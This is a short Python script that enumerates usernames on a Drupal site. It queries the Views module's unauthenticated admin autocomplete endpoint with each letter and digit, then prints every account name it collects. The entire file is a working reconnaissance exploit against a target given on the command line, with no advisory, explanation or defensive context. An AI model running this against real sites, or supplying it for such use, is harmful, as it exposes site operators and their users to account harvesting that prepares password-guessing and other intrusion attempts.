import requests
import ast
import sys
from  termcolor import colored
users = {}
target = sys.argv[1]
alphabets = "abcdefghijklmnopqrstuvwxyz.-123456789+"


try:
    # URI
    v = requests.get('{}/?q=admin/views/ajax/autocomplete/user/a'.format(target))
    if v.text.count('"Anonymous"') >=1:
        for i in alphabets:
            try:
                r = requests.get('{}/?q=admin/views/ajax/autocomplete/user/{}'.format(target,i))
                # print 'Users with ',i,' fetched successfully'
                if r.text.count('[  ]')==0:
                    try:
                        new_users = ast.literal_eval(r.text)
                        users.update(new_users)
                    except Exception as e:
                        print " cannot convert string to dictionary "
                        print e
            except Exception as e :
                    print e
                    print i
        for j in users:
                print colored(j+':'+users[j], 'green')

except Exception as e :
        print e
        print "Cannot Get URL !!!"
